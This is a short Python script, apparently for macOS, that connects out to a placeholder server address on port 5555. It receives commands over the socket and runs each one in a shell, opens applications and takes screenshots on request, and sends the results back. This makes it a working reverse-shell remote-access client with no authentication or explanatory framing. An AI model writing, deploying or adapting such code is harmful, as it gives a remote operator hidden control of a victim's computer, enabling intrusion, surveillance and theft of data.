import socket
import subprocess

def execute_command(command):
    try:
        if command.lower() == "exit":
            return "Goodbye!"

        elif command.startswith("open"):
            app = command.split(" ", 1)[1]
            subprocess.Popen(["open", "-a", app])
            return f"Opening {app}..."

        elif command == "screenshot":
            screenshot_path = "screenshot.png"
            subprocess.run(["screencapture", screenshot_path])
            return f"Screenshot saved as {screenshot_path}"

        else:
            output = subprocess.check_output(command, shell=True, text=True)
            return output
    except Exception as e:
        return str(e)

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("SERVER_IP", 5555))  # Replace SERVER_IP with the actual server address
    print("Connected to server.")
    
    while True:
        try:
            command = client.recv(1024).decode()
            if not command:
                break
            
            response = execute_command(command)
            client.send(response.encode())
        
        except Exception as e:
            print(f"Error: {e}")
            break
    
    client.close()

if __name__ == "__main__":
    main()
